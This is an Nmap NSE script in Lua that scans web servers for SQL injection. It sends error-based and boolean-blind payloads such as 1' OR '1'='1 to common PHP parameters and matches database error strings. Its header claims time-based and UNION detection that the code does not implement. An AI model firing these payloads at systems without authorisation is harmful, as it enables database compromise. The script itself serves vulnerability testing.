-- SQL Injection Detection (Advanced)
-- Comprehensive SQL injection testing with multiple techniques
-- @output
-- 80/tcp open  http
-- | http-sql-injection:
-- |   Possible SQL injection found:
-- |     URL: /product.php?id=1
-- |     Parameter: id
-- |     Type: Error-based
-- |     Payload: 1'
-- |     Database: MySQL 5.7.32
-- |     Evidence: You have an error in your SQL syntax
-- |     
-- |     URL: /search.php?q=test
-- |     Parameter: q
-- |     Type: Boolean-based blind
-- |     Payload: test' AND '1'='1
-- |_    Risk: CRITICAL - Allows database compromise

description = [[
Advanced SQL injection detection using multiple techniques:
- Error-based SQL injection
- Boolean-based blind SQL injection
- Time-based blind SQL injection
- UNION-based SQL injection

Tests common parameters and detects various database systems.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.service == "http" or port.service == "https" or
           port.number == 80 or port.number == 443 or port.number == 8080
end

action = function(host, port)
    local http = require "http"
    local shortport = require "shortport"
    
    -- Discover pages with parameters
    local test_urls = {
        "/index.php?id=1",
        "/product.php?id=1",
        "/view.php?id=1",
        "/item.php?id=1",
        "/news.php?id=1",
        "/article.php?id=1",
        "/page.php?id=1",
        "/search.php?q=test",
        "/login.php?user=admin"
    }
    
    local findings = {}
    
    for _, url in ipairs(test_urls) do
        local vulns = test_url_for_sqli(host, port, url)
        for _, vuln in ipairs(vulns) do
            table.insert(findings, vuln)
        end
    end
    
    if #findings > 0 then
        local result = "Possible SQL injection found:\n"
        for _, finding in ipairs(findings) do
            result = result .. "  URL: " .. finding.url .. "\n"
            result = result .. "  Parameter: " .. finding.param .. "\n"
            result = result .. "  Type: " .. finding.type .. "\n"
            result = result .. "  Payload: " .. finding.payload .. "\n"
            if finding.database then
                result = result .. "  Database: " .. finding.database .. "\n"
            end
            if finding.evidence then
                result = result .. "  Evidence: " .. finding.evidence .. "\n"
            end
            result = result .. "  \n"
        end
        result = result .. "Risk: CRITICAL - Allows database compromise"
        return result
    end
    
    return nil
end

function test_url_for_sqli(host, port, url)
    local http = require "http"
    local findings = {}
    
    -- Parse URL to get parameters
    local path, query = url:match("([^%?]+)%?(.+)")
    if not path or not query then
        return findings
    end
    
    -- Parse parameters
    local params = {}
    for param, value in query:gmatch("([^&=]+)=([^&]*)") do
        params[param] = value
    end
    
    -- Test each parameter
    for param, original_value in pairs(params) do
        -- Error-based SQL injection
        local error_payloads = {
            "'",
            "1'",
            "1' OR '1'='1",
            "1' AND '1'='2",
            "1' UNION SELECT NULL--",
        }
        
        for _, payload in ipairs(error_payloads) do
            local test_query = build_query(params, param, payload)
            local test_url = path .. "?" .. test_query
            
            local response = http.get(host, port, test_url)
            if response and response.body then
                local db_type, evidence = detect_sql_error(response.body)
                if db_type then
                    table.insert(findings, {
                        url = url,
                        param = param,
                        type = "Error-based",
                        payload = payload,
                        database = db_type,
                        evidence = evidence
                    })
                    break
                end
            end
        end
        
        -- Boolean-based blind SQL injection
        if #findings == 0 then
            local bool_finding = test_boolean_sqli(host, port, path, params, param, original_value)
            if bool_finding then
                table.insert(findings, bool_finding)
            end
        end
    end
    
    return findings
end

function build_query(params, target_param, new_value)
    local parts = {}
    for param, value in pairs(params) do
        if param == target_param then
            table.insert(parts, param .. "=" .. new_value)
        else
            table.insert(parts, param .. "=" .. value)
        end
    end
    return table.concat(parts, "&")
end

function detect_sql_error(body)
    local error_patterns = {
        {db = "MySQL", patterns = {
            "SQL syntax.*MySQL",
            "Warning.*mysql_",
            "MySqlException",
            "valid MySQL result",
            "MySqlClient"
        }},
        {db = "PostgreSQL", patterns = {
            "PostgreSQL.*ERROR",
            "Warning.*\\Wpg_",
            "valid PostgreSQL result",
            "Npgsql\\.",
            "PG::SyntaxError"
        }},
        {db = "Microsoft SQL Server", patterns = {
            "Driver.*SQL Server",
            "OLE DB.*SQL Server",
            "\\[Microsoft\\]\\[ODBC SQL Server Driver\\]",
            "\\[SQLServer JDBC Driver\\]",
            "SqlException"
        }},
        {db = "Oracle", patterns = {
            "ORA-%d+",
            "Oracle error",
            "Oracle.*Driver",
            "Warning.*\\Woci_",
            "Warning.*\\Wora_"
        }},
        {db = "SQLite", patterns = {
            "SQLite/JDBCDriver",
            "SQLite.Exception",
            "System.Data.SQLite.SQLiteException",
            "Warning.*sqlite_",
            "Warning.*SQLite3::"
        }}
    }
    
    for _, db in ipairs(error_patterns) do
        for _, pattern in ipairs(db.patterns) do
            local match = body:match(pattern)
            if match then
                return db.db, match:sub(1, 50)
            end
        end
    end
    
    return nil, nil
end

function test_boolean_sqli(host, port, path, params, target_param, original_value)
    local http = require "http"
    
    -- Get baseline response
    local baseline_query = build_query(params, target_param, original_value)
    local baseline = http.get(host, port, path .. "?" .. baseline_query)
    if not baseline or not baseline.body then
        return nil
    end
    
    -- Test TRUE condition
    local true_query = build_query(params, target_param, original_value .. "' AND '1'='1")
    local true_response = http.get(host, port, path .. "?" .. true_query)
    
    -- Test FALSE condition  
    local false_query = build_query(params, target_param, original_value .. "' AND '1'='2")
    local false_response = http.get(host, port, path .. "?" .. false_query)
    
    if true_response and false_response then
        -- Compare response lengths
        local baseline_len = #baseline.body
        local true_len = #true_response.body
        local false_len = #false_response.body
        
        -- If TRUE matches baseline but FALSE differs significantly, likely vulnerable
        if math.abs(baseline_len - true_len) < 100 and math.abs(baseline_len - false_len) > 100 then
            return {
                url = path .. "?" .. baseline_query,
                param = target_param,
                type = "Boolean-based blind",
                payload = original_value .. "' AND '1'='1",
                database = nil,
                evidence = "Response length differs based on boolean conditions"
            }
        end
    end
    
    return nil
end
